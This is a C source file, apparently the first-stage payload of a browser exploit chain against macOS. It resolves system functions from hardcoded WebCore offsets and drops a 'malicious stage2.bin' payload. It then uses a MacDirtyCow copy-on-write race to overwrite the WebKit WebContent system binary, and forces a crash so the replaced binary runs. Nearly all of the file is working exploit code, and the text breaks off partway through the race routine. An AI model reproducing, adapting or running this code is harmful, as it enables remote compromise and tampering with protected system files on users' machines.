#include "stage1.h"
#include <dlfcn.h>
#include <asl.h>
#include <unistd.h>
#include <fcntl.h>

#include <pthread.h>
#include <dispatch/dispatch.h>
#include <stdio.h>

#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>

#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h> 


#define GLOB __attribute__((section("__TEXT, __text")))
// this will create "anonymous" global char[] from a string literal
// e.g. strcmp(a, CSTR("hello"));
#define CSTR(x) ({\
        static GLOB char tempstr[] = x;\
        tempstr;\
        })

__attribute__((section("__TEXT, __text")))
uint64_t memcmp_addr = 0;

//libsystem_c
__attribute__((section("__TEXT, __text")))
uint64_t libc_base = 0;
__attribute__((section("__TEXT, __text")))
uint64_t dlopen_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t dlsym_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t open_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t read_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t confstr_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t exit_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t fprintf_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t mmap_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t munmap_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t time_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t usleep_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t strcat_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t lseek_addr = 0;

//libdispatch
__attribute__((section("__TEXT, __text")))
uint64_t libdispatch_base = 0;
__attribute__((section("__TEXT, __text")))
uint64_t dispatch_semaphore_create_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t dispatch_semaphore_signal_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t dispatch_semaphore_wait_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t mach_make_memory_entry_64_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t mach_port_deallocate_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t pthread_create_addr = 0;

//libsystem_pthread
__attribute__((section("__TEXT, __text")))
uint64_t libpthread_base = 0;
__attribute__((section("__TEXT, __text")))
uint64_t pthread_join_addr = 0;
// __attribute__((section("__TEXT, __text")))
// uint64_t pthread_mutex_init_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t pthread_mutex_lock_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t pthread_mutex_unlock_addr = 0;

//libsystem_kernel
__attribute__((section("__TEXT, __text")))
uint64_t libk_base = 0;
__attribute__((section("__TEXT, __text")))
uint64_t vm_allocate_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t vm_deallocate_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t vm_map_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t vm_protect_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t vm_read_overwrite_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t mach_task_self_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t memset_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t memcpy_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t fstat_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t close_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t malloc_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t free_addr = 0;
__attribute__((section("__TEXT, __text")))
uint64_t write_addr = 0;

int _start(unsigned long long webcore_base, uint64_t stage2_payload, uint64_t stage2_len) {

    memcmp_addr = webcore_base + 0x2322d70; 
    memset_addr = webcore_base + 0x2322d88; 

    // getFuncAddress(webcore_base);
    libc_base = webcore_base - 0x10177a000; 
    dlopen_addr = libc_base + 0x826c4;  
    dlsym_addr = libc_base + 0x826ca;   
    open_addr = libc_base + 0x8250e;    
    read_addr = libc_base + 0x829dc;    
    confstr_addr = libc_base + 0x7108;  
    vm_allocate_addr = libc_base + 0x82ac6; 
    exit_addr = libc_base + 0x2ebcb;    
    fprintf_addr = libc_base + 0x14b49; 
    mmap_addr = libc_base + 0x82898;    
    munmap_addr = libc_base + 0x8289e;  
    time_addr = libc_base + 0xf64d; 
    usleep_addr = libc_base + 0x10754;  
    strcat_addr = libc_base + 0xac47;   
    lseek_addr = libc_base + 0x8280e;   

    libdispatch_base = webcore_base - 0x101802000;  
    dispatch_semaphore_create_addr = libdispatch_base + 0x3b6e; 
    dispatch_semaphore_signal_addr = libdispatch_base + 0x3c1f; 
    dispatch_semaphore_wait_addr = libdispatch_base + 0x3c2d;   
    mach_make_memory_entry_64_addr = libdispatch_base + 0x36acc;    
    mach_port_deallocate_addr = libdispatch_base + 0x36ae4; 
    pthread_create_addr = libdispatch_base + 0x36c04;   

    libpthread_base = webcore_base - 0x10164a000;   
    pthread_join_addr = libpthread_base + 0x5fcc;   
    // pthread_mutex_init_addr = libpthread_base + 0x2704; 
    pthread_mutex_lock_addr = libpthread_base + 0x187e; 
    pthread_mutex_unlock_addr = libpthread_base + 0x1cf2;   

    libk_base = webcore_base - 0x101682000;  
    vm_allocate_addr = libk_base + 0x3473;  
    vm_deallocate_addr = libk_base + 0x3523;    
    vm_map_addr = libk_base + 0xabdc;   
    vm_protect_addr = libk_base + 0x51be;   
    vm_read_overwrite_addr = libk_base + 0x23a9c;   
    mach_task_self_addr = libk_base + 0x4181a9c4;
    memcpy_addr = libk_base + 0x1c81;   
    fstat_addr = libk_base + 0x224c;   
    close_addr = libk_base + 0x2398;    
    malloc_addr = libk_base + 0x69a2;   
    free_addr = libk_base + 0x710b; 
    write_addr = libk_base + 0x4754;    

    f_dlopen(CSTR("/usr/lib/system/libsystem_pthread.dylib"), RTLD_NOW);
    f_dlopen(CSTR("/usr/lib/system/libdispatch.dylib"), RTLD_NOW);
    void* libsystem_asl = f_dlopen(CSTR("/usr/lib/system/libsystem_asl.dylib"), RTLD_NOW);
    void *asl_log_addr = f_dlsym(libsystem_asl, CSTR("asl_log"));
    typedef int (*asl_log_func_t)(void*, void*, int, const char*, ...);
    asl_log_func_t f_asl_log = (asl_log_func_t)asl_log_addr;

    f_asl_log(NULL, NULL, ASL_LEVEL_ERR, CSTR("[stage1] Stage 1 Loaded!!!"));   //log test

    //drop stage2.bin
    char stage2_path[1024];
    size_t len = f_confstr(_CS_DARWIN_USER_TEMP_DIR, stage2_path, sizeof(stage2_path));
    f_strcat(stage2_path, CSTR("stage2.bin"));
    f_asl_log(NULL, NULL, ASL_LEVEL_ERR, CSTR("[stage1] stage2_path = %s"), stage2_path);

    int stage2_fd = f_open3(stage2_path, O_TRUNC | O_CREAT | O_RDWR, 0644);
    f_asl_log(NULL, NULL, ASL_LEVEL_ERR, CSTR("[stage1] stage2_fd = %d\n"), stage2_fd);

    int stage2_written_sz = f_write(stage2_fd, stage2_payload, stage2_len);
    f_asl_log(NULL, NULL, ASL_LEVEL_ERR, CSTR("[stage1] stage2 written size= %d\n"), stage2_written_sz);
    f_close(stage2_fd);


    //backup webcontent 
    char webcontent_backup_path[1024];
    len = f_confstr(_CS_DARWIN_USER_TEMP_DIR, webcontent_backup_path, sizeof(webcontent_backup_path));
    f_strcat(webcontent_backup_path, CSTR("webcontent.bak"));
    f_asl_log(NULL, NULL, ASL_LEVEL_ERR, CSTR("[stage1] webcontent_backup_path = %s"), webcontent_backup_path);
    backup_webcontent(webcontent_backup_path);

    //overwrite malicious stage2.bin to webcontent
    int test = overwrite_file_from_source(CSTR("/System/Library/Frameworks/WebKit.framework/Versions/A/XPCServices/com.apple.WebKit.WebContent.xpc/Contents/MacOS/com.apple.WebKit.WebContent"), stage2_path);
    f_asl_log(NULL, NULL, ASL_LEVEL_ERR, CSTR("[stage1] overwrite_file_from_source ret = %d"), test);

    f_exit(1);  //force crash to run malicious webcontent

    return 0;
}

int my_strlen(char *str) {
	int len;

	len = 0;
	while (str[len] != '\0')
		len++;
	return (len);
}

int backup_webcontent(const char* dest_path) {
    int src_fd = f_open(CSTR("/System/Library/Frameworks/WebKit.framework/Versions/A/XPCServices/com.apple.WebKit.WebContent.xpc/Contents/MacOS/com.apple.WebKit.WebContent"), O_RDONLY);
    if (src_fd < 0) {
        return -1;
    }

    int dest_fd = f_open3(dest_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (dest_fd < 0) {
        f_close(src_fd);
        return -2;
    }

    off_t file_size = f_lseek(src_fd, 0, SEEK_END);
    f_lseek(src_fd, 0, SEEK_SET); 

    char *buffer = (char *)f_malloc_char(file_size);
    if (!buffer) {
        f_close(src_fd);
        f_close(dest_fd);
        return -3;
    }

    ssize_t bytes_read = f_read(src_fd, buffer, file_size);
    if (bytes_read != file_size) {
    } else {
        ssize_t bytes_written = f_write(dest_fd, buffer, file_size);
        if (bytes_written != file_size) {
        }
    }

    f_free_char(buffer);
    f_close(src_fd);
    f_close(dest_fd);

    return 0;
}

void* f_dlopen(const char* filename, int flag) {
    typedef void* (*dlopen_func_t)(const char*, int);
    dlopen_func_t dlopen_func = (dlopen_func_t)dlopen_addr;
    return dlopen_func(filename, flag);
}

int f_open(const char *filepath, int flag) {
    typedef int (*open_func_t)(const char*, int);
    open_func_t open_func = (open_func_t)open_addr;
    return open_func(filepath, flag);
}

int f_open3(const char *path, int flags, mode_t mode) {
    typedef int (*open_func_t)(const char *, int, mode_t);
    open_func_t open_func = (open_func_t) open_addr;
    return open_func(path, flags, mode);
}

ssize_t f_read(int fd, void *buf, size_t nbytes) {
    typedef ssize_t (*read_func_t)(int, void*, size_t);
    read_func_t read_func = (read_func_t)read_addr;
    return read_func(fd, buf, nbytes);
}

size_t f_confstr(int name, char *buf, size_t len) {
    typedef size_t (*confstr_func_t)(int, char*, size_t);
    confstr_func_t confstr_func = (confstr_func_t)confstr_addr;
    return confstr_func(name, buf, len);
}

void* f_dlsym(void *image, char* symbol) {
    typedef void* (*dlsym_func_t)(void*, char*);
    dlsym_func_t dlsym_func = (dlsym_func_t)dlsym_addr;
    return dlsym_func(image, symbol);
}

dispatch_semaphore_t f_dispatch_semaphore_create(intptr_t value) {
    typedef dispatch_semaphore_t (*dispatch_semaphore_create_func_t)(intptr_t);
    dispatch_semaphore_create_func_t dispatch_semaphore_create_func = (dispatch_semaphore_create_func_t)dispatch_semaphore_create_addr;
    return dispatch_semaphore_create_func(value);
}

intptr_t f_dispatch_semaphore_signal(dispatch_semaphore_t dsema) {
    typedef intptr_t (*dispatch_semaphore_signal_func_t)(dispatch_semaphore_t);
    dispatch_semaphore_signal_func_t dispatch_semaphore_signal_func = (dispatch_semaphore_signal_func_t)dispatch_semaphore_signal_addr;
    return dispatch_semaphore_signal_func(dsema);
}

intptr_t f_dispatch_semaphore_wait(dispatch_semaphore_t dsema, dispatch_time_t timeout) {
    typedef intptr_t (*dispatch_semaphore_wait_func_t)(dispatch_semaphore_t, dispatch_time_t);
    dispatch_semaphore_wait_func_t dispatch_semaphore_wait_func = (dispatch_semaphore_wait_func_t)dispatch_semaphore_wait_addr;
    return dispatch_semaphore_wait_func(dsema, timeout);
}

void f_exit(int a1) {
    typedef void (*exit_func_t)(int);
    exit_func_t exit_func = (exit_func_t)exit_addr;
    return exit_func(a1);
}

int f_fprintf(FILE *stream, const char *format, ...) {
    typedef int (*fprintf_func_t)(FILE *, const char *, va_list);
    fprintf_func_t fprintf_func = (fprintf_func_t)fprintf_addr;
    
    va_list args;
    
    va_start(args, format);
    int ret = fprintf_func(stream, format, args);
    va_end(args);
    
    return ret;
}

kern_return_t f_mach_make_memory_entry_64(vm_map_t target_task, memory_object_size_t *size, memory_object_offset_t offset, vm_prot_t permission, mach_port_t *object_handle, mem_entry_name_port_t parent_entry)
{
    typedef kern_return_t (*mach_make_memory_entry_64_func_t)(
        vm_map_t,
        memory_object_size_t *,
        memory_object_offset_t,
        vm_prot_t,
        mach_port_t*,
        mem_entry_name_port_t);
    
    mach_make_memory_entry_64_func_t mach_make_memory_entry_64_func =
        (mach_make_memory_entry_64_func_t)mach_make_memory_entry_64_addr;
    
    return mach_make_memory_entry_64_func(target_task, size, offset, permission, object_handle, parent_entry);
}

kern_return_t f_mach_port_deallocate(ipc_space_t task, mach_port_name_t name) {
    typedef kern_return_t (*mach_port_deallocate_func_t)(ipc_space_t, mach_port_name_t);
    mach_port_deallocate_func_t mach_port_deallocate_func =
        (mach_port_deallocate_func_t)mach_port_deallocate_addr;
    return mach_port_deallocate_func(task, name);
}

int f_memcmp(const void *s1, const void *s2, size_t n) {
    typedef int (*memcmp_func_t)(const void*, const void*, size_t);
    memcmp_func_t memcmp_func = (memcmp_func_t)memcmp_addr;
    return memcmp_func(s1, s2, n);
}


void *f_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset) {
    typedef void *(*mmap_func_t)(void *, size_t, int, int, int, off_t);
    mmap_func_t mmap_func = (mmap_func_t)mmap_addr;
    return mmap_func(addr, length, prot, flags, fd, offset);
}

int f_munmap(void *addr, size_t length) {
    typedef int (*munmap_func_t)(void *, size_t);
    munmap_func_t munmap_func = (munmap_func_t)munmap_addr;
    return munmap_func(addr, length);
}

int f_pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine)(void *), void * arg) {
    typedef int (*pthread_create_func_t)(pthread_t *, const pthread_attr_t *, void *(*)(void *), void *);
    pthread_create_func_t pthread_create_func = (pthread_create_func_t) pthread_create_addr;
    return pthread_create_func(thread, attr, start_routine, arg);
}

int f_pthread_join(pthread_t thread, void **retval) {
    typedef int (*pthread_join_func_t)(pthread_t, void **);
    pthread_join_func_t pthread_join_func = (pthread_join_func_t) pthread_join_addr;
    return pthread_join_func(thread, retval);
}

int f_pthread_mutex_init(pthread_mutex_t *mutex, const pthread_mutexattr_t *attr) {
    void* libpthread = f_dlopen(CSTR("/usr/lib/system/libsystem_pthread.dylib"), RTLD_NOW);
    void *pthread_mutex_init_addr = f_dlsym(libpthread, CSTR("pthread_mutex_init"));
    typedef int (*pthread_mutex_init_func_t)(pthread_mutex_t *, const pthread_mutexattr_t *);
    pthread_mutex_init_func_t func = (pthread_mutex_init_func_t) pthread_mutex_init_addr;
    return func(mutex, attr);
}

int f_pthread_mutex_lock(pthread_mutex_t *mutex) {
    typedef int (*pthread_mutex_lock_func_t)(pthread_mutex_t *);
    pthread_mutex_lock_func_t func = (pthread_mutex_lock_func_t) pthread_mutex_lock_addr;
    return func(mutex);
}

int f_pthread_mutex_unlock(pthread_mutex_t *mutex) {
    typedef int (*pthread_mutex_unlock_func_t)(pthread_mutex_t *);
    pthread_mutex_unlock_func_t func = (pthread_mutex_unlock_func_t) pthread_mutex_unlock_addr;
    return func(mutex);
}

time_t f_time(time_t *tloc) {
    typedef time_t (*time_func_t)(time_t *);
    time_func_t func = (time_func_t) time_addr;
    return func(tloc);
}

int f_usleep(useconds_t usec) {
    typedef int (*usleep_func_t)(useconds_t);
    usleep_func_t func = (usleep_func_t) usleep_addr;
    return func(usec);
}

kern_return_t f_vm_allocate(vm_map_t target_task, vm_address_t *address, vm_size_t size, int flags) {
    typedef kern_return_t (*vm_allocate_func_t)(vm_map_t, vm_address_t *, vm_size_t, int);
    vm_allocate_func_t func = (vm_allocate_func_t) vm_allocate_addr;
    return func(target_task, address, size, flags);
}

kern_return_t f_vm_deallocate(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size) {
    typedef kern_return_t (*vm_deallocate_func_t)(vm_map_t, mach_vm_address_t, mach_vm_size_t);
    vm_deallocate_func_t func = (vm_deallocate_func_t) vm_deallocate_addr;
    return func(target_task, address, size);
}


kern_return_t f_vm_map(vm_map_t target_task, mach_vm_address_t *address, mach_vm_size_t size, mach_vm_offset_t mask,
    int flags, mem_entry_name_port_t object, memory_object_offset_t offset, boolean_t copy,
    vm_prot_t cur_protection, vm_prot_t max_protection, vm_inherit_t inheritance) {
typedef kern_return_t (*vm_map_func_t)(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_offset_t, int,
                        mem_entry_name_port_t, memory_object_offset_t, boolean_t,
                        vm_prot_t, vm_prot_t, vm_inherit_t);
vm_map_func_t func = (vm_map_func_t) vm_map_addr;
return func(target_task, address, size, mask, flags, object, offset, copy, cur_protection, max_protection, inheritance);
}

kern_return_t f_vm_protect(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, boolean_t set_maximum, vm_prot_t new_protection) {
    typedef kern_return_t (*vm_protect_func_t)(vm_map_t, mach_vm_address_t, mach_vm_size_t, boolean_t, vm_prot_t);
    vm_protect_func_t func = (vm_protect_func_t) vm_protect_addr;
    return func(target_task, address, size, set_maximum, new_protection);
}

kern_return_t f_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size,
                                  mach_vm_address_t data, mach_vm_size_t *out_size) {
    typedef kern_return_t (*vm_read_overwrite_func_t)(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);
    vm_read_overwrite_func_t func = (vm_read_overwrite_func_t) vm_read_overwrite_addr;
    return func(target_task, address, size, data, out_size);
}

mach_port_t f_mach_task_self(void) {
    uint32_t *ptr = (uint32_t *)mach_task_self_addr;
    uint32_t value = *ptr;
    return value;
}

int *f_memset(void *s, int c, size_t len) {
    typedef void *(*memset_func_t)(void *, uint8_t, uint64_t);
    memset_func_t func = (memset_func_t) memset_addr;
    return func(s, c, len);
}

void *f_memcpy(void *dest, const void *src, size_t n) {
    typedef void *(*memcpy_func_t)(void *, const void *, size_t);
    memcpy_func_t func = (memcpy_func_t) memcpy_addr;
    return func(dest, src, n);
}

int f_close(int fd) {
    typedef int (*close_func_t)(int);
    close_func_t close_func = (close_func_t) close_addr;
    return close_func(fd);
}

int f_fstat(int fd, struct stat *statbuf) {
    typedef int (*fstat_func_t)(int, struct stat *);
    fstat_func_t fstat_func = (fstat_func_t) fstat_addr;
    return fstat_func(fd, statbuf);
}

void *f_malloc(size_t size) {
    typedef void *(*malloc_func_t)(size_t);
    malloc_func_t malloc_func = (malloc_func_t)malloc_addr;
    return malloc_func(size);
}

char *f_malloc_char(size_t size) {
    typedef char *(*malloc_func_t)(size_t);
    malloc_func_t malloc_func = (malloc_func_t)malloc_addr;
    return malloc_func(size);
}

void f_free(void *ptr) {
    typedef void (*free_func_t)(void *);
    free_func_t free_func = (free_func_t)free_addr;
    free_func(ptr);
}

void f_free_char(char *ptr) {
    typedef void (*free_func_t)(char *);
    free_func_t free_func = (free_func_t)free_addr;
    free_func(ptr);
}


char* f_strcat(char* dest, char* src) {
    typedef char* (*strcat_func_t)(char*, char*);
    strcat_func_t strcat_func = (strcat_func_t)strcat_addr;
    return strcat_func(dest, src);
}

ssize_t f_write(int fd, const void *buf, size_t count) {
    typedef ssize_t (*write_func_t)(int, const void *, size_t);
    write_func_t write_func = (write_func_t)write_addr;
    return write_func(fd, buf, count);
}

off_t f_lseek(int fd, off_t offset, int whence) {
    typedef off_t (*lseek_func_t)(int, off_t, int);
    lseek_func_t lseek_func = (lseek_func_t)lseek_addr;
    return lseek_func(fd, offset, whence);
}

int overwrite_file_from_source(const char *targetPath, const char *sourcePath) {
    int src_fd = f_open(sourcePath, O_RDONLY);
    if (src_fd < 0) {
        return -1;
    }
    
    struct stat src_stat;
    if (f_fstat(src_fd, &src_stat) < 0) {
        f_close(src_fd);
        return -2;
    }
    size_t srcSize = src_stat.st_size;
    
    char *srcBuffer = f_malloc(srcSize);
    if (!srcBuffer) {
        f_close(src_fd);
        return -3;
    }
    
    size_t totalRead = 0;
    while (totalRead < srcSize) {
        ssize_t bytesRead = f_read(src_fd, srcBuffer + totalRead, srcSize - totalRead);
        if (bytesRead <= 0) {
            f_free(srcBuffer);
            f_close(src_fd);
            return -4;
        }
        totalRead += bytesRead;
    }
    f_close(src_fd);
    
    int target_fd = f_open(targetPath, O_RDONLY);
    if (target_fd < 0) {
        f_free(srcBuffer);
        return -5;
    }
    
    struct stat tgt_stat;
    if (f_fstat(target_fd, &tgt_stat) < 0) {
        f_free(srcBuffer);
        f_close(target_fd);
        return -6;
    }
    size_t tgtSize = tgt_stat.st_size;
    
    char *writeBuffer = f_malloc(tgtSize);
    if (!writeBuffer) {
        f_free(srcBuffer);
        f_close(target_fd);
        return -7;
    }
    
    if (srcSize < tgtSize) {
        f_memcpy(writeBuffer, srcBuffer, srcSize);
        f_memset(writeBuffer + srcSize, 0, tgtSize - srcSize);
    } else {
        f_memcpy(writeBuffer, srcBuffer, tgtSize);
    }
    f_free(srcBuffer);
    
    bool success = overwrite_file(target_fd, writeBuffer, tgtSize);
    f_free(writeBuffer);
    f_close(target_fd);
    
    return success ? 0 : -1;
}

bool overwrite_file(int fd, const void *sourceData, size_t sourceDataLength) {
    for (int off = 0; off < sourceDataLength; off += 0x4000) {
        bool success = false;
        for (int i = 0; i < 2; i++) {
            size_t chunkSize = (off + 0x4000 > sourceDataLength) ? (sourceDataLength - off) : 0x4000;

            if (unaligned_copy_switch_race(fd, off, (const char *)sourceData + off, chunkSize, false)) {
                success = true;
                break;
            }
        }
        if (!success) {
            return false;
        }
    }
    return true;
}


//MacDirtyCow
#define T_QUIET
#define T_EXPECT_MACH_SUCCESS(a, b)
#define T_EXPECT_MACH_ERROR(a, b, c)
#define T_ASSERT_MACH_SUCCESS(a, b, ...)
#define T_ASSERT_MACH_ERROR(a, b, c)
#define T_ASSERT_POSIX_SUCCESS(a, b)
#define T_ASSERT_EQ(a, b, c) do{if ((a) != (b)) { f_exit(1); }}while(0)
#define T_ASSERT_NE(a, b, c) do{if ((a) == (b)) { f_exit(1); }}while(0)
#define T_ASSERT_TRUE(a, b, ...)
#define T_LOG(a, ...) ;
#define T_DECL(a, b) static void a(void)
#define T_PASS(a, ...) ;

struct context1 {
    vm_size_t obj_size;
    vm_address_t e0;
    mach_port_t mem_entry_ro;
    mach_port_t mem_entry_rw;
    dispatch_semaphore_t running_sem;
    pthread_mutex_t mtx;
    volatile bool done;
};

void * 
switcheroo_thread(void *arg)
{
    kern_return_t kr;
    struct context1 *ctx;

    ctx = (struct context1 *)arg;
    /* tell main thread we're ready to run */
    f_dispatch_semaphore_signal(ctx->running_sem);
    while (!ctx->done) {
        /* wait for main thread to be done setting things up */
        f_pthread_mutex_lock(&ctx->mtx);
        if (ctx->done) {
      f_pthread_mutex_unlock(&ctx->mtx);
            break;
        }
        /* switch e0 to RW mapping */
        kr = f_vm_map(f_mach_task_self(),
            &ctx->e0,
            ctx->obj_size,
            0,         /* mask */
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
            ctx->mem_entry_rw,
            0,
            FALSE,         /* copy */
            VM_PROT_READ | VM_PROT_WRITE,
            VM_PROT_READ | VM_PROT_WRITE,
            VM_INHERIT_DEFAULT);
        T_QUIET; T_EXPECT_MACH_SUCCESS(kr, CSTR(" vm_map() RW"));
        /* wait a little bit */
        f_usleep(100);
        /* switch bakc to original RO mapping */
        kr = f_vm_map(f_mach_task_self(),
            &ctx->e0,
            ctx->obj_size,
            0,         /* mask */
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
            ctx->mem_entry_ro,
            0,
            FALSE,         /* copy */
            VM_PROT_READ,
            VM_PROT_READ,
            VM_INHERIT_DEFAULT);
        T_QUIET; T_EXPECT_MACH_SUCCESS(kr, CSTR(" vm_map() RO"));
        /* tell main thread we're don switching mappings */
        f_pthread_mutex_unlock(&ctx->mtx);
        f_usleep(100);
    }
    return NULL;
}

bool unaligned_copy_switch_race(int file_to_overwrite, off_t file_offset, const void* overwrite_data, size_t overwrite_length, bool unmapAtEnd) {
    void* libsystem_asl = f_dlopen(CSTR("/usr/lib/system/libsystem_asl.dylib"), RTLD_NOW);
    void *asl_log_addr = f_dlsym(libsystem_asl, CSTR("asl_log"));
    typedef int (*asl_log_func_t)(void*, void*, int, const char*, ...);
    asl_log_func_t f_asl_log = (asl_log_func_t)asl_log_addr;

    /////
    bool retval = false;
    pthread_t th = NULL;
    int ret;
    kern_return_t kr;
    time_t start, duration;
#if 0
    mach_msg_type_number_t cow_read_size;
#endif
    vm_size_t copied_size;
    int loops;
    vm_address_t e2, e5;
    struct context1 context1, *ctx;
    int kern_success = 0, kern_protection_failure = 0, kern_other = 0;
    vm_address_t ro_addr, tmp_addr;
    memory_object_size_t mo_size;

    ctx = &context1;
    ctx->obj_size = 256 * 1024;

    void* file_mapped = f_mmap(NULL, ctx->obj_size, PROT_READ, MAP_SHARED, file_to_overwrite, file_offset);
    if (file_mapped == MAP_FAILED) {
        return false;
    }
    if (!f_memcmp(file_mapped, overwrite_data, overwrite_length)) {
        f_munmap(file_mapped, ctx->obj_size);
        return true;
    }
    ro_addr = (vm_address_t)file_mapped;

    ctx->e0 = 0;
    ctx->running_sem = f_dispatch_semaphore_create(0);
    T_QUIET; 
    T_ASSERT_NE(ctx->running_sem, NULL, CSTR("dispatch_semaphore_create"));
    ret = f_pthread_mutex_init(&ctx->mtx, NULL);
    T_QUIET; T_ASSERT_POSIX_SUCCESS(ret, CSTR("pthread_mutex_init"));
    ctx->done = false;
    ctx->mem_entry_rw = MACH_PORT_NULL;
    ctx->mem_entry_ro = MACH_PORT_NULL;
#if 0
    /* allocate our attack target memory */
    kr = vm_allocate(mach_task_self(),
        &ro_addr,
        ctx->obj_size,
        VM_FLAGS_ANYWHERE);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate ro_addr");
    /* initialize to 'A' */
    memset((char *)ro_addr, 'A', ctx->obj_size);
#endif

    /* make it read-only */
    kr = f_vm_protect(f_mach_task_self(),
        ro_addr,
        ctx->obj_size,
        TRUE,             /* set_maximum */
        VM_PROT_READ); 
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, CSTR("vm_protect ro_addr"));

    /* make sure we can't get read-write handle on that target memory */
    mo_size = ctx->obj_size;
    kr = f_mach_make_memory_entry_64(f_mach_task_self(),
        &mo_size,
        ro_addr,
        MAP_MEM_VM_SHARE | VM_PROT_READ | VM_PROT_WRITE,
        &ctx->mem_entry_ro,
        MACH_PORT_NULL);
    T_QUIET; T_ASSERT_MACH_ERROR(kr, KERN_PROTECTION_FAILURE, CSTR("make_mem_entry() RO"));
    // f_asl_log(NULL, NULL, ASL_LEVEL_ERR, CSTR("[stage1] make_mem_entry 1 kr = 0x%x"), kr);
    /* take read-only handle on that target memory */
    mo_size = ctx->obj_size;
    kr = f_mach_make_memory_entry_64(f_mach_task_self(),
        &mo_size,
        ro_addr,
        MAP_MEM_VM_SHARE | VM_PROT_READ,
        &ctx->mem_entry_ro,
        MACH_PORT_NULL);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, CSTR("make_mem_entry() RO"));

    T_QUIET; 
    // T_ASSERT_EQ(mo_size, (memory_object_size_t)ctx->obj_size, CSTR("wrong mem_entry size"));
    /* make sure we can't map target memory as writable */
    tmp_addr = 0;
    kr = f_vm_map(f_mach_task_self(),
        &tmp_addr,
        ctx->obj_size,
        0,         /* mask */
        VM_FLAGS_ANYWHERE,
        ctx->mem_entry_ro,
        0,
        FALSE,         /* copy */
        VM_PROT_READ,
        VM_PROT_READ | VM_PROT_WRITE,
        VM_INHERIT_DEFAULT);
    T_QUIET; T_EXPECT_MACH_ERROR(kr, KERN_INVALID_RIGHT, CSTR(" vm_map() mem_entry_rw"));

    tmp_addr = 0; 
    kr = f_vm_map(f_mach_task_self(),
        &tmp_addr,
        ctx->obj_size,
        0,         /* mask */
        VM_FLAGS_ANYWHERE,
        ctx->mem_entry_ro,
        0,
        FALSE,         /* copy */
        VM_PROT_READ | VM_PROT_WRITE,
        VM_PROT_READ | VM_PROT_WRITE,
        VM_INHERIT_DEFAULT);
    T_QUIET; T_EXPECT_MACH_ERROR(kr, KERN_INVALID_RIGHT, CSTR(" vm_map() mem_entry_rw"));

    /* allocate a source buffer for the unaligned copy */
    kr = f_vm_allocate(f_mach_task_self(),
        &e5,
        ctx->obj_size * 2,
        VM_FLAGS_ANYWHERE);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, CSTR("vm_allocate e5"));

    /* initialize to 'C' */ 
    f_memset((char *)e5, 'C', ctx->obj_size * 2);

    char* e5_overwrite_ptr = (char*)(e5 + ctx->obj_size - 1);
    f_memcpy(e5_overwrite_ptr, overwrite_data, overwrite_length);

    int overwrite_first_diff_offset = -1;
    char overwrite_first_diff_value = 0;
    for (int off = 0; off < overwrite_length; off++) {
        if (((char*)ro_addr)[off] != e5_overwrite_ptr[off]) {
            overwrite_first_diff_offset = off;
            overwrite_first_diff_value = ((char*)ro_addr)[off];
        }
    }
    if (overwrite_first_diff_offset == -1) {
        return false;
    }

    /*
     * get a handle on some writable memory that will be temporarily
     * switched with the read-only mapping of our target memory to try
     * and trick copy_unaligned to write to our read-only target.
     */
    tmp_addr = 0;
    kr = f_vm_allocate(f_mach_task_self(),
        &tmp_addr,
        ctx->obj_size,
        VM_FLAGS_ANYWHERE);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, CSTR("vm_allocate() some rw memory")); 
    /* initialize to 'D' */
    f_memset((char *)tmp_addr, 'D', ctx->obj_size); 
    /* get a memory entry handle for that RW memory */
    mo_size = ctx->obj_size;
    kr = f_mach_make_memory_entry_64(f_mach_task_self(),
        &mo_size,
        tmp_addr,
        MAP_MEM_VM_SHARE | VM_PROT_READ | VM_PROT_WRITE,
        &ctx->mem_entry_rw,
        MACH_PORT_NULL);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, CSTR("make_mem_entry() RW"));
    T_QUIET; 
    // T_ASSERT_EQ(mo_size, (memory_object_size_t)ctx->obj_size, CSTR("wrong mem_entry size"));
